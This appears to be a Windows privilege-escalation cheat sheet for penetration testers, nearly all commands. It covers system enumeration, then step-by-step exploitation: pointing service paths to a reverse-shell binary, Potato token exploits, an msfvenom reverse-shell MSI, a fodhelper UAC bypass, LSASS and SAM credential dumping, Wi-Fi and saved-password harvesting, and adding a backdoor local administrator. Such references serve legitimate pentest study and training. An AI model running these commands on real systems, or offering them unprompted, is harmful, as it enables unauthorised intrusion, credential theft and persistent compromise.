---
title: Windows Priv E
subtitle: WINDOWS PRIVESC

sidebar:
  - label: ENUMERATION
    items:
      - id: wpe-enum-system
        text: "System Info"
      - id: wpe-enum-users
        text: "Users & Groups"
      - id: wpe-enum-network
        text: "Network"
      - id: wpe-enum-processes
        text: "Processes & Services"
      - id: wpe-enum-apps
        text: "Installed Apps"
      - id: wpe-enum-tasks
        text: "Scheduled Tasks"
  - label: EXPLOITATION
    items:
      - id: wpe-services
        text: "Weak Services"
      - id: wpe-tokens
        text: "Token Impersonation"
      - id: wpe-registry
        text: "Registry Attacks"
      - id: wpe-uac
        text: "UAC Bypass"
      - id: wpe-kernel
        text: "Kernel Exploits"
      - id: wpe-credentials
        text: "Credentials"
      - id: wpe-lateral
        text: "Lateral Movement"
---

## SYSTEM INFO
<!-- id: wpe-enum-system -->

> Fingerprint the OS, patch level, and architecture before anything else. systeminfo reveals missing patches which feed directly into kernel exploit searches. whoami /all shows your current token and all privileges.

### OS and environment

#### cmd | OS, patch level, and full user context
```
systeminfo
whoami /all
```

#### cmd | Architecture and environment variables
```
set
[environment]::OSVersion.Version
```

#### cmd | Antivirus detection
```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
```

#### cmd | Connected computers and shares
```
net view
net view \\<computername>
```

#### cmd | WSL / bash availability (lateral move opportunity)
```
where bash.exe 2>nul
dir C:\Windows\System32\bash.exe 2>nul
```

## USERS & GROUPS
<!-- id: wpe-enum-users -->

> Enumerate all local users, their group memberships, and currently logged-in sessions. Members of Administrators, Backup Operators, and Remote Desktop Users are all escalation targets.

### User and group enumeration

#### cmd | All local users
```
net user
```

#### cmd | Current user details
```
net user %username%
whoami /priv
```

#### cmd | Local groups and members
```
net localgroup
net localgroup administrators
```

#### cmd | Domain groups (if domain-joined)
```
net group
```

#### cmd | Currently logged in users
```
qwinsta
```

## NETWORK
<!-- id: wpe-enum-network -->

> Look for services listening on localhost that aren't externally reachable — these are common privesc paths as they often run as SYSTEM with weaker authentication assumptions.

### Network enumeration

#### cmd | IP configuration and interfaces
```
ipconfig /all
```

#### cmd | All active connections and listening ports with PIDs
```
netstat -ano
```

#### cmd | Routing table
```
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

#### cmd | ARP cache (adjacent hosts)
```
arp -A
```

#### cmd | Firewall state and config
```
netsh firewall show state
netsh firewall show config
netsh advfirewall show allprofiles
```

#### cmd | Hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```

## PROCESSES & SERVICES
<!-- id: wpe-enum-processes -->

> Processes running as SYSTEM or a privileged user are targets. Collect full command lines and executable paths — weak file permissions on a SYSTEM process executable means you can replace it.

### Process enumeration

#### cmd | All running processes with owner and path
```
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name,ProcessId,@{Label="Owner";Expression={$_.GetOwner().User}},ExecutablePath | ft -AutoSize
```

#### cmd | Full command lines (spot credentials in args)
```
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name,ProcessId,@{Label="Owner";Expression={$_.GetOwner().User}},CommandLine | ft -AutoSize
```

#### cmd | All services with binary path and run-as user
```
Get-WmiObject win32_service | Select Name,DisplayName,StartName,State,PathName | ft -AutoSize
```

#### cmd | Services not running as LocalSystem (check these)
```
Get-WmiObject win32_service | Select Name,PathName,StartMode,StartName | Where-Object {$_.StartName -ne "LocalSystem"} | ft -AutoSize
```

#### cmd | Loaded DLLs for a specific process
```
# Download: https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls
.\Listdlls.exe /accepteula <PID>
```

## INSTALLED APPS
<!-- id: wpe-enum-apps -->

> Non-standard installed software often has known privesc exploits. Auto-run binaries and their registry entries are a classic target — if you can overwrite the binary or its registry path, you get code execution as whatever user triggers it.

### Applications and autoruns

#### PowerShell | Installed software list
```
winget list
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
```

#### cmd | Auto-run binaries from registry
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

#### cmd | Auto-runs via Sysinternals (comprehensive)
```
# Download: https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
.\autorunsc.exe /accepteula -a * > autoruns.txt
```

#### cmd | Check permissions on an auto-run binary
```
.\accesschk.exe /accepteula -wvu "C:\path\to\program.exe"
```

## SCHEDULED TASKS
<!-- id: wpe-enum-tasks -->

> Standard users cannot see all scheduled tasks — only non-Microsoft ones are visible. If the task binary path is writable, replace it. If the task runs as SYSTEM, it's an instant escalation.

### Task enumeration

#### PowerShell | Non-Microsoft scheduled tasks
```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

#### cmd | Detailed task info including run-as user
```
schtasks /query /fo LIST /v | findstr /i "task\|run as\|status\|next run"
```

#### cmd | Check permissions on a task binary
```
.\accesschk.exe /accepteula -wvu "C:\path\to\task\binary.exe"
```

## WEAK SERVICES
<!-- id: wpe-services -->

> Four service attack vectors: unquoted paths, weak ACLs on the service config itself, weak registry permissions, and writable service executables. accesschk.exe from Sysinternals is the essential tool — check current user, Authenticated Users, Everyone, and Users groups.

### Unquoted service paths

> If a service binary path contains spaces and is not quoted, Windows tries each space-delimited segment as a potential executable. Place a malicious binary at one of those locations.

#### cmd | Find all unquoted service paths
```
Get-WmiObject win32_service | select Name,PathName | where {$_.PathName -notlike '"*' -and $_.PathName -notlike 'C:\Windows\*'} | ft -AutoSize
```

#### cmd | Alternative using wmic
```
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
```

#### cmd | Restart the vulnerable service after placing binary
```
net stop <servicename>
net start <servicename>
```

### Insecure service properties

> If your user has SERVICE_CHANGE_CONFIG permission on a service, you can change its binary path to your payload.

#### cmd | Check your permissions on all services
```
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" * > service_perms.txt
.\accesschk.exe /accepteula -uwcqv "%username%" *
```

#### cmd | Exploit — change binpath to reverse shell
```
sc config <servicename> binpath= "\"C:\Temp\reverse.exe\""
net stop <servicename>
net start <servicename>
```

### Weak registry permissions

> If you can write to a service's registry key, you can change the ImagePath (binary path) without touching the service config via sc.

#### cmd | Dump all service ImagePaths
```
reg query HKLM\System\CurrentControlSet\Services /s /v imagepath
```

#### cmd | Check your permissions on service registry keys
```
.\accesschk.exe /accepteula -uvwqk "Authenticated Users" "HKLM\System\CurrentControlSet\services"
```

#### cmd | Exploit — overwrite ImagePath in registry
```
reg add HKLM\SYSTEM\CurrentControlSet\services\<servicename> /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\reverse.exe" /f
net stop <servicename>
net start <servicename>
```

### Insecure service executables

> If you can write to the binary that a SYSTEM service executes, replace it with your payload.

#### cmd | Find writable files in program directories
```
.\accesschk.exe /accepteula -uwdqs "Authenticated Users" "C:\*" > writable_dirs.txt
.\accesschk.exe /accepteula -uwdqs "Everyone" "C:\*" >> writable_dirs.txt
```

#### cmd | Check HKLM software registry for writable keys
```
.\accesschk.exe /accepteula -uvwqk "Authenticated Users" "HKLM\Software"
```

## TOKEN IMPERSONATION
<!-- id: wpe-tokens -->

> SeImpersonatePrivilege and SeAssignPrimaryToken are the most common privesc tokens — service accounts and IIS workers often have them. Potato exploits abuse COM/DCOM to coerce a SYSTEM token then impersonate it. SeBackupPrivilege allows reading any file including SAM/SYSTEM hives.

### Check privileges

#### cmd | List all token privileges and their state
```
whoami /priv
```

> SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege → Potato exploits. SeBackupPrivilege → dump hives. SeDebugPrivilege → dump LSASS.

### SeImpersonatePrivilege — Potato exploits

#### GodPotato | Works on Windows Server 2012-2022, Win 8-11
```
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\Temp\reverse.exe"
```

#### PrintSpoofer | Works where Potatoes don't (newer systems)
```
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\Temp\reverse.exe"
```

#### JuicyPotatoNG | Alternative — requires CLSID
```
JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c C:\Temp\reverse.exe"
```

> Potato history: <a href="https://github.com/bodik/awesome-potatoes" target="_blank">awesome-potatoes</a> · <a href="https://ohpe.it/juicy-potato/CLSID/" target="_blank">CLSID list</a>

### SeBackupPrivilege — SAM/SYSTEM dump

#### cmd | Save hives and dump locally
```
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
# Transfer to attacker machine, then:
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### SeDebugPrivilege — LSASS dump

#### cmd | Dump LSASS with procdump
```
.\procdump.exe -accepteula -r -ma lsass.exe C:\Temp\lsass.dmp
```

#### cmd | If LSASS is protected — use nanodump
```
# https://github.com/fortra/nanodump
.\nanodump.x64.exe --write C:\Temp\lsass.dmp -sll --valid
```

#### cmd | Parse dump on attacker machine
```
pypykatz lsa minidump lsass.dmp
```

## REGISTRY ATTACKS
<!-- id: wpe-registry -->

> AlwaysInstallElevated lets any user install MSI packages as SYSTEM — both HKCU and HKLM keys must be set to 1. Autologon credentials are stored in plaintext in the registry and are frequently found on workstations.

### AlwaysInstallElevated

#### cmd | Check if enabled (both must return 0x1)
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### cmd | Create and run malicious MSI
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### Stored credentials in registry

#### cmd | Autologon plaintext credentials
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### cmd | PuTTY saved sessions
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

## UAC BYPASS
<!-- id: wpe-uac -->

> UAC is a consent prompt mechanism, not a security boundary. If you already have a local admin account, UAC is usually bypassable. Check whether UAC is actually enabled before spending time bypassing it.

### Check UAC configuration

#### cmd | Check if UAC is enabled (1 = enabled)
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

#### cmd | Check UAC level
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# 0 = no prompt, 2 = always prompt, 5 (default) = prompt for non-Windows binaries
```

#### cmd | Check LocalAccountTokenFilterPolicy
```
REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy
# 0 = only RID 500 bypasses UAC remotely, 1 = all admins bypass UAC
```

### Exploit UAC

#### PowerShell | If UAC is disabled — direct elevation
```
Start-Process powershell -Verb runAs "C:\Temp\reverse.exe"
```

#### cmd | fodhelper UAC bypass (Windows 10)
```
# Works when current user is in Administrators group
# Set registry key, then trigger fodhelper
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Temp\reverse.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
```

> Tool: <a href="https://github.com/hfiref0x/UACME" target="_blank">UACME</a> — comprehensive UAC bypass collection with OS version targeting

## KERNEL EXPLOITS
<!-- id: wpe-kernel -->

> Windows kernel exploits are highly version-specific. systeminfo gives the exact build. WES (Windows Exploit Suggester) cross-references against a CVE database and filters for privilege escalation only.

### Enumerate and exploit

#### cmd | Collect system info for WES
```
systeminfo > systeminfo.txt
# Transfer to attacker machine:
python3 wes.py systeminfo.txt -i "Elevation of Privilege" --exploits-only -d
```

#### cmd | Check drivers (driver vulns are common in older systems)
```
driverquery.exe /fo csv
Get-WmiObject Win32_PnPSignedDriver | Select devicename,driverversion | ft
```

> Resources: <a href="https://github.com/bitsadmin/wesng" target="_blank">WES-NG</a> · <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">Pre-compiled exploits</a> (Win7/2008: CVE-2018-8120)

## CREDENTIALS
<!-- id: wpe-credentials -->

> Credentials show up in PowerShell history, environment variables, clipboard, config files, and browser storage. cmdkey /list reveals saved credentials you can reuse with runas /savecred without knowing the password.

### Search for credentials

#### cmd | PowerShell command history
```
(Get-PSReadlineOption).HistorySavePath
type (Get-PSReadlineOption).HistorySavePath
# Also check: C:\Users\<user>\Documents\ for transcript files
```

#### cmd | Clipboard contents
```
Get-Clipboard
```

#### cmd | Saved Windows credentials
```
cmdkey /list
# Reuse without knowing password:
runas /savecred /user:<domain>\<user> "C:\Temp\reverse.exe"
```

#### cmd | Wi-Fi passwords
```
netsh wlan show profiles
netsh wlan show profile name="<profile_name>" key=clear
```

#### cmd | Environment variables (credentials in env)
```
Get-ChildItem env:* | Sort-Object Name | Format-List
```

#### cmd | Search files for password strings
```
findstr /si password *.txt *.xml *.ini *.config *.bat
dir /s /b *pass* *cred* *vnc* *.config* 2>nul
findstr /spin "password" *.*
```

#### cmd | Registry search for passwords
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

> Tools: <a href="https://github.com/SnaffCon/Snaffler" target="_blank">Snaffler</a> (share enumeration) · <a href="https://github.com/moonD4rk/HackBrowserData" target="_blank">HackBrowserData</a> (browser credentials)

## LATERAL MOVEMENT
<!-- id: wpe-lateral -->

> Once you have admin credentials or hashes, pivot using PsExec, WMI, or WinRM. Creating a local admin is a reliable persistence method — use a complex password to avoid password policy rejection.

### Move and persist

#### cmd | Get SYSTEM shell via PsExec
```
.\PsExec.exe -accepteula -i -s cmd.exe
```

#### cmd | Create a local administrator account
```
net user <username> <Password123!> /add /y
net localgroup administrators <username> /add
```

#### cmd | LSASS dump (full — for offline cracking)
```
.\procdump.exe -accepteula -r -ma lsass.exe C:\Temp\lsass.dmp
```

#### cmd | SAM/SYSTEM hive dump
```
# Use your hive copy script or:
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

#### cmd | Parse LSASS dump on attacker machine
```
pypykatz lsa minidump lsass.dmp
```

#### cmd | Parse hive dump on attacker machine
```
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```
